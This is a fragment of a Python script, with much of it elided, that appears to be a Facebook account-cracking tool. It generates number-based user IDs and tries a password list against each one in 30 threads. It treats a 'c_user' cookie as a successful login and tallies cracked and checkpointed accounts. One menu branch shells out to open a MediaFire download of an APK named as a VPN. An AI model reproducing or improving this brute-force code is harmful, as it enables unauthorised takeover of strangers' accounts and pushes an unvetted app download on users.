        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AYAAN_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Ayaan:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Ayaan.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AYAAN=session.cookies.get_dict().keys()
                        if "c_user" in AYAAN:
